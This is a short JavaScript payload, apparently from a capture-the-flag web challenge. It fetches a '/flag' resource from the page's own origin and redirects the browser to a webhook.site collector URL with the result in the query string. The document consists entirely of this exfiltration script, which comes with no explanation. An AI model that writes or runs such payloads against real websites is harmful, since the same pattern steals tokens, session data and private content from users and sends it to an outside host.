async function sendFlag() {
    try {
        const response = await fetch(`${window.location.protocol}//${window.location.host}/flag`);
        const flag = await response.text();
        window.location.href = `https://webhook.site/cea9c192-8247-491d-b878-fad3603abf86?flag=${flag}`;
    } catch (error) {
        console.error('Error fetching the flag:', error);
    }
}

sendFlag();
